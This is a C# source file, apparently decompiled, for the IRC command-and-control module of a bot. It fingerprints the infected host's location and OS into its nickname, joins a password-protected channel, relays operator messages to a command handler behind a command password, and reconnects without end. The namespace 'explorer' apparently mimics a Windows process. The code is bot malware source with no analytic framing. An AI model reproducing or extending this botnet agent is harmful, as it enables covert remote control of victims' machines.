using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Threading;

namespace explorer;

internal class irc
{
	private TcpClient socket;

	private NetworkStream stream;

	private StreamReader reader;

	private StreamWriter writer;

	private List<string> userList = new List<string>();

	private handler msghanlder;

	public Thread handlerThread;

	public Thread connCheckThread;

	public teller teller;

	public string host;

	public int port;

	public string nick;

	public string user;

	public string realname;

	public void loginUser(string nick, string password)
	{
		if (password == config.cmdPassword)
		{
			if (!isLoggedIn(nick))
			{
				userList.Add(nick);
				teller.tell(config.channel, "Main", config.language_usystem_success_login.Replace("%user%", nick), iserror: false, isinformation: true, iswarning: false);
			}
			else
			{
				teller.tell(config.channel, "Main", config.language_usystem_error_login.Replace("%user%", nick), iserror: true, isinformation: false, iswarning: false);
			}
		}
		else
		{
			teller.tell(config.channel, "Main", config.language_usystem_password_error.Replace("%user%", nick), iserror: true, isinformation: false, iswarning: false);
		}
	}

	public void logoutUser(string nick)
	{
		if (isLoggedIn(nick))
		{
			userList.Remove(nick);
			teller.tell(config.channel, "Main", config.language_usystem_success_logout.Replace("%user%", nick), iserror: false, isinformation: true, iswarning: false);
		}
		else
		{
			teller.tell(config.channel, "Main", config.language_usystem_error_logout.Replace("%user%", nick), iserror: true, isinformation: false, iswarning: false);
		}
	}

	public bool isLoggedIn(string nick)
	{
		return userList.Contains(nick);
	}

	public irc(string host, int port, bool makeThread)
	{
		this.host = host;
		this.port = port;
		string newValue = misc.nickGenerator(config.randomLength);
		nick = config.nick.Replace("%location%", misc.getLoc()).Replace("%os%", misc.getOS()).Replace("%rand%", newValue);
		user = config.user.Replace("%location%", misc.getLoc()).Replace("%os%", misc.getOS()).Replace("%rand%", newValue);
		realname = config.realName.Replace("%location%", misc.getLoc()).Replace("%os%", misc.getOS()).Replace("%rand%", newValue);
		teller = new teller(this);
		if (makeThread)
		{
			connect();
		}
	}

	public void setHandler(handler h)
	{
		msghanlder = h;
	}

	public void connect()
	{
		try
		{
			socket = new TcpClient(host, port);
			stream = socket.GetStream();
			reader = new StreamReader(stream);
			writer = new StreamWriter(stream);
			createHandlerThread();
			createConnCheckThread();
		}
		catch
		{
			connect();
		}
	}

	public void createHandlerThread()
	{
		handlerThread = new Thread(handlerThreadfunc);
		handlerThread.Start();
	}

	private void handlerThreadfunc()
	{
		sendUser(user, visible: true, realname);
		sendNick(nick);
		sendJoin(config.channel, config.channelpass);
		int num = 0;
		try
		{
			string text;
			while ((text = reader.ReadLine()) != null)
			{
				num++;
				if (text.StartsWith(":"))
				{
					text = text.Substring(1);
					bool flag = false;
					if (text.Contains("372") && text.Contains("MOTD"))
					{
						sendJoin(config.channel, config.channelpass);
					}
					if (text.Contains(" MODE "))
					{
						sendJoin(config.channel, config.channelpass);
					}
					if (text.Contains("PRIVMSG"))
					{
						text = text.Substring(0, text.IndexOf(" PRIVMSG ") + 9) + misc.GetStringInBetween(" PRIVMSG ", " :", text, includeBegin: false, includeEnd: true).ToLower() + text.Substring(text.IndexOf(" :") + 2);
					}
					if (text.Contains("PRIVMSG"))
					{
						flag = true;
					}
					string text2 = " PRIVMSG " + config.channel + " :";
					if (text.Contains(text2))
					{
						string message = text.Substring(text.IndexOf(text2) + text2.Length);
						string text3 = text.Substring(0, text.IndexOf("!"));
						msghanlder.messageReceived(message, text3, config.channel, this);
					}
					else if (flag)
					{
						string message2 = text.Substring(text.IndexOf(":") + 1);
						string text4 = text.Substring(0, text.IndexOf("!"));
						string stringInBetween = misc.GetStringInBetween(" PRIVMSG ", " :", text, includeBegin: false, includeEnd: false);
						msghanlder.messageReceived(message2, text4, stringInBetween, this);
					}
				}
				else if (text.StartsWith("PING"))
				{
					Write("PONG " + text.Substring(5));
				}
			}
		}
		catch
		{
		}
		killConnCheckThread();
		connect();
	}

	private void createConnCheckThread()
	{
		connCheckThread = new Thread(connCheckfunc);
		connCheckThread.Start();
	}

	private void killConnCheckThread()
	{
		connCheckThread.Suspend();
	}

	private void connCheckfunc()
	{
		bool flag = true;
		while (flag)
		{
			try
			{
				sendPing();
			}
			catch
			{
				flag = false;
			}
			Thread.Sleep(10000);
		}
		try
		{
			handlerThread.Suspend();
		}
		catch
		{
		}
		connect();
	}

	public void Write(string txt)
	{
		writer.WriteLine(txt);
		writer.Flush();
	}

	public void sendPrivmsg(string channel, string message)
	{
		Write("PRIVMSG " + channel + " " + message.Replace(" ", "_"));
	}

	public void sendUser(string user, bool visible, string fullName)
	{
		string text = ((!visible) ? "1" : "0");
		Write("USER " + user + " " + text + " * : " + fullName);
	}

	public void sendNick(string nick)
	{
		Write("NICK " + nick);
	}

	public void sendJoin(string channel)
	{
		Write("JOIN " + channel);
	}

	public void sendJoin(string channel, string password)
	{
		Write("JOIN " + channel + " " + password);
	}

	public void sendQuit(string reason)
	{
		Write("QUIT " + reason);
	}

	public void sendQuit()
	{
		Write("QUIT");
	}

	public void sendPing()
	{
		Write("PING " + host + ":" + port);
	}

	public void sendPing(string data)
	{
		Write("PING " + data);
	}
}
